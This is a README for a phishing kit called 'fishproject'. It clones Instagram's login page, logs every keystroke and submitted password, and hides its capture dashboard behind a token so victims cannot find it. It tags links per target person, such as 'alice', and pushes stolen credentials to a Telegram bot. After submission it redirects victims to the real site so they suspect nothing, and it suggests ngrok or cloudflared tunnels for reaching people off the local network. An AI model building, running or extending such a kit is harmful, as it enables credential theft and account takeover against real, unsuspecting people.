# fishproject

Instagram-lookalike login page with a live keystroke + credential listener,
a token-gated dashboard, per-campaign tagging, and optional Telegram push.

## Layout

```
D:\cyber\fishproject\
  server.py           listener + static host (Python stdlib, no deps)
  dashboard.html      the capture dashboard (served only via /dash?k=<token>)
  ctl.ps1             start / stop / restart / status / log
  allow_firewall.ps1  elevation helper for inbound TCP 8080
  public\
    index.html        the cloned login page
    style.css         Instagram styling
    main.js           keystroke collector + submit capture + campaign tag
  logs\
    captures.log      JSONL, one record per event (appended live)
    dash_token.txt    persisted dashboard token (git-ignored)
    server.pid        pid of the background listener (git-ignored)
```

## Run

```powershell
cd D:\cyber\fishproject
.\ctl.ps1 start          # background, prints the victim URL + dashboard URL
.\ctl.ps1 stop           # kills the listener, keeps the log
.\ctl.ps1 status         # running? pid? URLs? log size? last event?
.\ctl.ps1 log            # live tail of captures.log (Ctrl+C to exit)
.\ctl.ps1 restart
```

If script execution is blocked, prefix with
`powershell -ExecutionPolicy Bypass -File .\ctl.ps1 start`.

Raw, without the wrapper:

```powershell
python server.py 8080    # foreground, Ctrl+C to stop
```

## Endpoints & URLs

| URL                              | Who uses it | What it does                                  |
| -------------------------------- | ----------- | --------------------------------------------- |
| `http://<lan-ip>:8080/`          | victim      | the cloned login page                         |
| `http://<lan-ip>:8080/?c=<name>` | victim      | same page, tags every event with `<name>`     |
| `http://<lan-ip>:8080/dash?k=..` | you         | live dashboard (needs the token)              |
| `POST /api/capture`              | page        | collects keystrokes + credentials             |

The dashboard token is generated on first run, persisted to
`logs\dash_token.txt`, and printed at startup and by `ctl.ps1 status`. Without
it `/dash` and `/api/events` return 404 — so a victim poking around can't find
your captures.

## Campaign tags

Send different people different links so nothing blurs together:

```
http://10.109.180.144:8080/?c=alice
http://10.109.180.144:8080/?c=bob-work
```

Every event (visit, keystroke, credentials) carries the tag. It shows up in the
log, in the console, and on the dashboard next to the credential.

## Telegram push (optional)

Get credentials on your phone the moment they're submitted:

```powershell
# create a bot with @BotFather -> copy the token
$env:FP_TELEGRAM_TOKEN = "123456:ABC..."
# message your bot once, then find your chat id at:
#   https://api.telegram.org/bot<TOKEN>/getUpdates   (look for "chat":{"id":...})
$env:FP_TELEGRAM_CHAT  = "987654321"

.\ctl.ps1 restart
```

Set both and the banner shows `telegram : ON`. Leave them unset and the kit
behaves exactly as before. Only credential submissions are pushed — keystrokes
would spam the chat; watch those on the dashboard.

## Firewall

A phone on the same Wi-Fi can only reach 8080 with an inbound allow rule.
Run **once, elevated**:

```powershell
powershell -ExecutionPolicy Bypass -File .\allow_firewall.ps1
```

Undo: `Remove-NetFirewallRule -DisplayName "fishproject-8080"`.

## What gets logged

* `visit`       - someone opened the page (ip, user-agent, campaign)
* `focus`       - which field they tapped into
* `keystroke`   - every key, per field, with the field's live value
* `input`       - paste / autofill / IME insertions
* `credentials` - the submitted username + password pair
* `hidden`/`bye`- tab backgrounded / closed (flushes the buffer)

Live view is the dashboard or the console; the durable record is
`logs\captures.log`.

## Read the log

```powershell
Get-Content D:\cyber\fishproject\logs\captures.log -Wait      # live tail

# just the credentials that were submitted
Select-String -Path D:\cyber\fishproject\logs\captures.log -Pattern '"event": "credentials"'

# pretty-print every record
Get-Content D:\cyber\fishproject\logs\captures.log | ForEach-Object { $_ | ConvertFrom-Json } | Format-List
```

## Notes

* The page posts with `keepalive`/`sendBeacon`, so keystrokes still land if the
  victim closes the tab mid-entry.
* On submit the page shows a "Logging in..." beat then redirects to the real
  instagram.com, so the victim assumes a normal failed login.
* Only reachable on the LAN. For a link that works off-Wi-Fi you need a tunnel
  (cloudflared / ngrok) in front of port 8080.
